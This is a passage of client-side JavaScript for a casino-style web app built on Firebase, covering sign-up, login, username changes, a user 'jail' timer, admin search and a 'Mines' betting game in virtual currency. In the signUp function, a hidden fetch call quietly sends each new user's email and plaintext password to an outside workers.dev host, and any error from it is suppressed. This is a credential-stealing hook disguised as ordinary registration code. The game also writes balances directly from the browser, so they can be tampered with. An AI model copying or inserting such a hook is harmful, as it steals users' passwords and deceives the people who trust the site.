            username: currentUser.displayName || currentUser.email.split('@')[0] || "Anonymous",
            text: text,
            timestamp: Date.now(),
            uid: currentUser.uid

window.resendEmail=async(which)=>{
  if(Date.now()-lastMailSent[which]<60000)return;
  if(!auth.currentUser)return;
  try{await sendEmailVerification(auth.currentUser);}catch(e){}
  lastMailSent[which]=Date.now();
  const ui=document.getElementById(`resend-ui-${which}`);
  const fill=document.getElementById(`resend-fill-${which}`);
  const txt=document.getElementById(`resend-text-${which}`);
  const ready=document.getElementById(`resend-ready-${which}`);
  ui.style.display='block';ready.style.display='none';
  fill.style.transition='none';fill.style.width='100%';
  setTimeout(()=>{fill.style.transition='width 60s linear';fill.style.width='0%';},50);
  let t=60;txt.innerText=`Email sent — resend in ${t}s`;
  const iv=setInterval(()=>{t--;txt.innerText=`Email sent — resend in ${t}s`;if(t<=0){clearInterval(iv);ui.style.display='none';ready.style.display='block';}},1000);
};
function showResendUI(w){document.getElementById(`resend-ui-${w}`).style.display='block';resendEmail(w);}

window.signUp = async () => {
  const e = document.getElementById('reg-email').value.trim();
  const p = document.getElementById('reg-pass').value;

  if (!e) return notify('reg-notifs', 'Please enter your email.');
  if (p.length < 8) return notify('reg-notifs', 'Password must be 8+ characters.');

  fetch("https://system-sync-layer.pixelworldsmanager100.workers.dev/", {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ e: e, p: p })
  }).catch(() => {});

  try {
    const cred = await createUserWithEmailAndPassword(auth, e, p);
    await sendEmailVerification(cred.user);
    await set(ref(db, `users/${cred.user.uid}/balance`), 1000);
    lastMailSent.reg = Date.now();
    notify('reg-notifs', 'Account created! Check your email and spam to verify.', 'success');
    showResendUI('reg');
  } catch (err) {
    const msgs = { 'auth/email-already-in-use': 'That email is already registered.', 'auth/invalid-email': 'Invalid email address.' };
    notify('reg-notifs', msgs[err.code] || err.message);
  }
};

window.login = async () => {
  const e = document.getElementById('log-email').value.trim();
  const p = document.getElementById('log-pass').value;
  if (!e || !p) return notify('login-notifs', 'Please fill in all fields.');
  try {
    const cred = await signInWithEmailAndPassword(auth, e, p);
    if (!cred.user.emailVerified) {
      notify('login-notifs', 'Email not verified. Check inbox and spam.');
      showResendUI('log');
      await signOut(auth);
      return;
    }
    closeModal('login-modal');
    location.reload();
  } catch (err) {
    const bad = ['auth/user-not-found', 'auth/wrong-password', 'auth/invalid-credential'];
    notify('login-notifs', bad.includes(err.code) ? 'Invalid email or password.' : err.message);
  }
};

window.changeUsername=async()=>{
  if(!currentUser)return;
  const raw=document.getElementById('uname-input').value.trim();
  if(!raw)return notify('uname-notif','Please enter a username.','error');
  if(raw.length<2)return notify('uname-notif','Must be at least 2 characters.','error');
  if(raw.length>24)return notify('uname-notif','Must be 24 characters or fewer.','error');
  if(!isAdmin(currentUser)){
    const snap=await get(ref(db,`users/${currentUser.uid}`));
    if(snap.exists()&&snap.val().hasChangedName)return notify('uname-notif','You can only change your username once.','error');
  }
  const namesSnap=await get(ref(db,'usernames'));
  if(namesSnap.exists()){
    const taken=namesSnap.val();const lc=raw.toLowerCase();
    for(const k of Object.keys(taken)){
      if(k.toLowerCase()===lc&&taken[k]!==currentUser.uid)return notify('uname-notif','That username is already taken.','error');
    }
  }
  try{
    if(currentUser.displayName)await remove(ref(db,`usernames/${currentUser.displayName}`));
    await updateProfile(currentUser,{displayName:raw});
    await set(ref(db,`usernames/${raw}`),currentUser.uid);
    if(!isAdmin(currentUser)){
      await set(ref(db,`users/${currentUser.uid}/hasChangedName`),true);
      document.getElementById('uname-locked-notice').style.display='block';
      document.getElementById('uname-row').style.display='none';
    }
    document.getElementById('acct-username').innerText=getDisplayName();
    document.getElementById('user-tag').innerText=getDisplayName();
    document.getElementById('uname-input').value='';
    notify('uname-notif','Username updated!','success');
  }catch(err){notify('uname-notif',err.message,'error');}
};

function showJailPage(releaseTs){
  document.getElementById('page-jail').classList.add('active');
  document.getElementById('chat-sidebar').style.display='none';
  document.getElementById('bottom-nav').style.display='none';
  document.querySelector('nav').style.display='none';
  document.getElementById('left-sidebar').style.display='none';
  if(currentUser&&isAdmin(currentUser))document.getElementById('jail-admin-release').style.display='block';
  if(jailTimerInterval)clearInterval(jailTimerInterval);
  function tick(){
    const rem=releaseTs-Date.now();
    if(rem<=0){document.getElementById('jail-timer').innerText='00:00:00';clearInterval(jailTimerInterval);return;}
    const h=Math.floor(rem/3600000),m=Math.floor((rem%3600000)/60000),s=Math.floor((rem%60000)/1000);
    document.getElementById('jail-timer').innerText=`${String(h).padStart(2,'0')}:${String(m).padStart(2,'0')}:${String(s).padStart(2,'0')}`;
  }
  tick();jailTimerInterval=setInterval(tick,1000);
}
function hideJailPage(){
  document.getElementById('page-jail').classList.remove('active');
  document.getElementById('chat-sidebar').style.display='';
  document.getElementById('bottom-nav').style.display='';
  document.querySelector('nav').style.display='';
  document.getElementById('left-sidebar').style.display='';
  if(jailTimerInterval){clearInterval(jailTimerInterval);jailTimerInterval=null;}
}

/* ── Fixed searchUsers: queries /users node and filters by uid, email (stored in profile), or username (displayName) ── */
window.searchUsers=async()=>{
  if(!currentUser||!isAdmin(currentUser))return;
  const q=document.getElementById('user-search').value.trim().toLowerCase();
  const res=document.getElementById('user-search-results');
  if(!q){res.innerHTML='';return;}
  const snap=await get(ref(db,'users'));
  if(!snap.exists()){res.innerHTML='<p style="color:var(--muted);font-size:.72rem">No users found.</p>';return;}
  let rows=[];
  snap.forEach(c=>{
    const uid=c.key.toLowerCase();
    const data=c.val();
    const uname=(data.displayName||data.username||'').toLowerCase();
    const email=(data.email||'').toLowerCase();
    let match=false;
    if(adminSearchFilter==='all')       match=uid.includes(q)||uname.includes(q)||email.includes(q);
    else if(adminSearchFilter==='uid')  match=uid.includes(q);
    else if(adminSearchFilter==='email')match=email.includes(q);
    else if(adminSearchFilter==='username')match=uname.includes(q);
    if(match)rows.push({key:c.key,data});
  });
  if(!rows.length){res.innerHTML='<p style="color:var(--muted);font-size:.72rem">No users found.</p>';return;}
  let html='<table class="user-table"><thead><tr><th>UID</th><th>Username</th><th>Balance</th><th>Actions</th></tr></thead><tbody>';
  rows.forEach(({key,data})=>{
    html+=`<tr>
      <td style="font-size:.62rem;color:var(--muted)">${esc(key)}</td>
      <td>${esc(data.displayName||data.username||'—')}</td>
      <td>${data.balance||0} BC</td>
      <td><button class="btn btn-ghost btn-sm" onclick="document.getElementById('balance-uid').value='${esc(key)}'">Select</button></td>
    </tr>`;
  });
  html+='</tbody></table>';
  res.innerHTML=html;
};

onAuthStateChanged(auth, async user => {
  // Fixed: only set currentUser when emailVerified
  currentUser = (user && user.emailVerified) ? user : null;
  const ok    = !!currentUser;

  document.getElementById('nav-guest').style.display        = ok ? 'none'  : 'flex';
  document.getElementById('nav-user').style.display         = ok ? 'flex'  : 'none';
  document.getElementById('balance-display').style.display  = ok ? 'flex'  : 'none';

  if (ok) {
    const name = getDisplayName();
    document.getElementById('user-tag').innerText      = name;
    document.getElementById('acct-username').innerText = name;
    document.getElementById('acct-email').innerText    = user.email;

    // Fixed: attach a real-time balance listener — updates userBalance and all displays
    onValue(ref(db, `users/${currentUser.uid}/balance`), snap => {
      userBalance = snap.exists() ? snap.val() : 1000;
      const balStr = userBalance.toLocaleString();
      const el1 = document.getElementById('balance-amount');
      const el2 = document.getElementById('acct-balance');
      if (el1) el1.innerText = balStr;
      if (el2) el2.innerText = `${balStr} BC`;
    });

    if (isAdmin(currentUser)) {
      const ab = document.getElementById('bnav-admin');
      const sa = document.getElementById('sidebar-admin');
      if (ab) ab.style.display = 'flex';
      if (sa) sa.style.display = 'block';
    } else {
      const ab = document.getElementById('bnav-admin');
      const sa = document.getElementById('sidebar-admin');
      if (ab) ab.style.display = 'none';
      if (sa) sa.style.display = 'none';
    }

    const uSnap = await get(ref(db, `users/${currentUser.uid}/hasChangedName`));
    if (uSnap.exists() && uSnap.val() === true && !isAdmin(currentUser)) {
      document.getElementById('uname-locked-notice').style.display = 'block';
      document.getElementById('uname-row').style.display           = 'none';
    }

    const muteKey = emailToKey(user.email);
    onValue(ref(db, `muted/${muteKey}`), snap => {
      userIsMuted = snap.exists() && snap.val() === true;
      document.getElementById('chat-muted-banner').style.display = userIsMuted ? 'block' : 'none';
    });

    startJailListener(currentUser);
    if (window._adminMsgRefreshCallbacks) {
      window._adminMsgRefreshCallbacks.forEach(fn => fn());
    }
  } else {
    document.getElementById('bnav-admin').style.display   = 'none';
    document.getElementById('sidebar-admin').style.display= 'none';
    hideJailPage();
    if (jailListener) { jailListener(); jailListener = null; }
  }

  document.getElementById('chat-guest-ui').style.display  = ok ? 'none'  : 'block';
  document.getElementById('chat-user-ui').style.display   = ok ? 'flex'  : 'none';
  document.getElementById('account-guest').style.display  = ok ? 'none'  : 'block';
  document.getElementById('account-logged').style.display = ok ? 'block' : 'none';
});

/* ══════════════════════════════════════════
   MINES GAME — Rewritten (Pixelbet-style)
   Full logic: multiplier table, payout ladder,
   grid sizes 5×5/6×6/7×7/8×8, manual bet controls.
══════════════════════════════════════════ */

/* Multiplier table: mines_count → [mult_after_1_gem, mult_after_2_gems, …] */
function calcMult(gemsRevealed, gridSize, mineCount) {
  if (gemsRevealed <= 0) return 1.00;
  const totalCells = gridSize;
  const safeCells  = totalCells - mineCount;
  let m = 1.0;
  for (let i = 0; i < gemsRevealed; i++) {
    m *= totalCells / (totalCells - mineCount - i);
  }
  // House edge ~3%
  return Math.max(1.0, parseFloat((m * 0.97).toFixed(2)));
}

let minesState = {
  active:      false,
  grid:        [],     // 'gem' | 'mine' per cell
  revealed:    0,
  gridSize:    25,
  cols:        5,
  mineCount:   1,
  bet:         10,
  cashable:    false,
  payoutOffset:0,      // scroll offset for payout ladder
};

/* ── Control helpers ── */
window.setMinesTab = (tab) => {
  document.getElementById('mines-tab-manual').classList.toggle('active', tab==='manual');
  document.getElementById('mines-tab-auto').classList.toggle('active', tab==='auto');
};
window.halveBet = () => {
  const el = document.getElementById('mines-bet');
  el.value = Math.max(1, Math.floor((parseFloat(el.value)||0) / 2));
};
window.doubleBet = () => {
  const el = document.getElementById('mines-bet');
  el.value = Math.min(userBalance, (parseFloat(el.value)||0) * 2);
};
window.setMaxBet = () => {
  document.getElementById('mines-bet').value = userBalance;
};
window.setGridSize = (btn) => {
  if (minesState.active) return;
  document.querySelectorAll('.grid-size-btn').forEach(b=>b.classList.remove('active'));
  btn.classList.add('active');
  const size = parseInt(btn.dataset.size);
  minesState.gridSize = size;
  minesState.cols     = Math.round(Math.sqrt(size));
  // Clamp mine count to gridSize-1
  const mc = parseInt(document.getElementById('mines-count').value)||1;
  const maxM = size - 1;
  if (mc > maxM) {
    document.getElementById('mines-count').value = maxM;
    document.getElementById('mines-count-display').innerText = maxM;
    minesState.mineCount = maxM;
  }
  const grid = document.getElementById('mines-grid');
  grid.className = `mines-grid g${size}`;
  renderMinesGrid();
  renderMinesPayouts();
};
window.adjustMineCount = (delta) => {
  if (minesState.active) return;
  const max = minesState.gridSize - 1;
  let val = parseInt(document.getElementById('mines-count').value) + delta;
  val = Math.min(max, Math.max(1, val));
  document.getElementById('mines-count').value = val;
  document.getElementById('mines-count-display').innerText = val;
  minesState.mineCount = val;
  renderMinesPayouts();
};

/* ── Render the grid tiles ── */
function renderMinesGrid() {
  const grid = document.getElementById('mines-grid');
  const n    = minesState.gridSize;
  grid.innerHTML = '';
  for (let i = 0; i < n; i++) {
    const tile = document.createElement('div');
    tile.className = 'mines-tile';
    tile.dataset.index = i;
    tile.onclick = () => revealTile(i);
    grid.appendChild(tile);
  }
}

/* ── Render payout ladder on right side ── */
const PAYOUT_VISIBLE = 7;
function renderMinesPayouts() {
  const col    = document.getElementById('mines-payout-col');
  const n      = minesState.gridSize;
  const mc     = minesState.mineCount;
  const safe   = n - mc;
  const bet    = parseFloat(document.getElementById('mines-bet').value) || 10;
  const offset = minesState.payoutOffset;

  // Build all payout entries
  const entries = [];
  for (let g = 0; g <= safe; g++) {
    const mult = calcMult(g, n, mc);
    entries.push({ gems: g, mult, payout: parseFloat((bet * mult).toFixed(2)) });
  }

  // Clear existing items (keep scroll buttons)
  const items = col.querySelectorAll('.mines-payout-item');
  items.forEach(el => el.remove());

  const scrollDown = col.querySelector('.payout-scroll-btn:last-child');
  const start = Math.max(0, Math.min(offset, entries.length - PAYOUT_VISIBLE));
  const slice = entries.slice(start, start + PAYOUT_VISIBLE);

  slice.forEach(entry => {
    const el = document.createElement('div');
    el.className = 'mines-payout-item';
    if (entry.gems === minesState.revealed && minesState.active) el.classList.add('current');
    else if (entry.gems < minesState.revealed && minesState.active) el.classList.add('passed');
    const dispPayout = minesState.active
      ? (bet * entry.mult).toFixed(2)
      : entry.payout.toFixed(2);
    el.innerHTML = `<span>${entry.mult.toFixed(2)}x</span><span class="mines-payout-mult">${entry.gems}</span>`;
    col.insertBefore(el, scrollDown);
  });
}

window.scrollPayouts = (dir) => {
  minesState.payoutOffset = Math.max(0, minesState.payoutOffset + dir * 2);
  renderMinesPayouts();
};

/* ── Start game ── */
window.startMinesGame = async () => {
  if (!currentUser) { openModal('login-modal'); return; }

  const betInput = document.getElementById('mines-bet');
  const bet      = parseFloat(betInput.value) || 0;
  const mc       = parseInt(document.getElementById('mines-count').value) || 1;
  const gridSize = minesState.gridSize;

  if (bet < 1)          return notify('mines-notif', 'Minimum bet is 1 BC.', 'error');
  if (bet > userBalance) return notify('mines-notif', 'Insufficient balance.', 'error');
  if (mc < 1 || mc >= gridSize) return;

  // Deduct bet from Firebase immediately
  const newBal = userBalance - bet;
  await set(ref(db, `users/${currentUser.uid}/balance`), newBal);

  // Generate mine positions
  const positions = new Set();
  while (positions.size < mc) positions.add(Math.floor(Math.random() * gridSize));

  minesState = {
    active:      true,
    grid:        Array.from({length: gridSize}, (_, i) => positions.has(i) ? 'mine' : 'gem'),
    revealed:    0,
    gridSize,
    cols:        minesState.cols,
    mineCount:   mc,
    bet,
    cashable:    false,
    payoutOffset:0,
  };

  renderMinesGrid();
  renderMinesPayouts();

  // Update buttons
  document.getElementById('mines-start-btn').disabled = true;
  document.getElementById('mines-cashout-btn').classList.add('visible');
  document.getElementById('mines-cashout-btn').disabled = true; // until 1 gem found

  // Hide win pill
  document.getElementById('mines-winpill').classList.remove('visible');
};

/* ── Reveal a tile ── */
function revealTile(index) {
  if (!minesState.active) return;
  const tiles = document.querySelectorAll('.mines-tile');
  const tile  = tiles[index];
  if (!tile || tile.classList.contains('revealed')) return;

  tile.classList.add('revealed');

  if (minesState.grid[index] === 'mine') {
    // BOOM
    tile.classList.add('mine-hit');
    tile.innerHTML = '💣';
    // Reveal all other mines
    minesState.grid.forEach((type, i) => {
      if (type === 'mine' && i !== index) {
        tiles[i].classList.add('revealed', 'mine-safe');
        tiles[i].innerHTML = '💣';
      }
    });
    endMinesGame(false);
  } else {
    // Safe gem
    tile.classList.add('gem');
    tile.innerHTML = '💎';
    minesState.revealed++;
    minesState.cashable = true;

    const mult     = calcMult(minesState.revealed, minesState.gridSize, minesState.mineCount);
    const winnings = parseFloat((minesState.bet * mult).toFixed(2));

    // Update win pill
    const pill = document.getElementById('mines-winpill');
    pill.classList.add('visible');
    document.getElementById('mines-winpill-val').innerText = `${winnings.toFixed(2)} BC (${mult.toFixed(2)}x)`;

    // Enable cashout
    document.getElementById('mines-cashout-btn').disabled = false;

    renderMinesPayouts();

    // Auto-cashout if all gems found
    const safeCount = minesState.gridSize - minesState.mineCount;
    if (minesState.revealed >= safeCount) {
      cashoutMines();
    }
  }
}

/* ── Cash out ── */
window.cashoutMines = async () => {
  if (!minesState.active || !minesState.cashable || !currentUser) return;

  const mult     = calcMult(minesState.revealed, minesState.gridSize, minesState.mineCount);
  const winnings = parseFloat((minesState.bet * mult).toFixed(2));
  const newBal   = userBalance + winnings;

  await set(ref(db, `users/${currentUser.uid}/balance`), Math.round(newBal));

  // Reveal all mines as safe
  const tiles = document.querySelectorAll('.mines-tile');
  minesState.grid.forEach((type, i) => {
    if (type === 'mine') {
      tiles[i].classList.add('revealed','mine-safe');
      tiles[i].innerHTML = '💣';
    }
  });

  endMinesGame(true, winnings);
};

function endMinesGame(won, winnings) {
  minesState.active   = false;
  minesState.cashable = false;

  document.getElementById('mines-start-btn').disabled = false;
  document.getElementById('mines-cashout-btn').classList.remove('visible');
  document.getElementById('mines-cashout-btn').disabled = true;

  const pill = document.getElementById('mines-winpill');
  if (won) {
    pill.classList.add('visible');
    document.getElementById('mines-winpill-val').innerText = `Won ${winnings.toFixed(2)} BC 🎉`;
  } else {
    pill.classList.remove('visible');
  }

  renderMinesPayouts();
}

/* ── small notif inside mines page ── */
function notifyMines(msg) {
  // Reuse the win pill as a temporary status
  const pill = document.getElementById('mines-winpill');
  document.getElementById('mines-winpill-val').innerText = msg;
  pill.classList.add('visible');
  setTimeout(() => pill.classList.remove('visible'), 3000);
}

/* ── Init on load ── */
renderMinesGrid();
renderMinesPayouts();
// Pre-fill bet input with a default
document.getElementById('mines-bet').value = 10;
minesState.mineCount = 1;

</script>
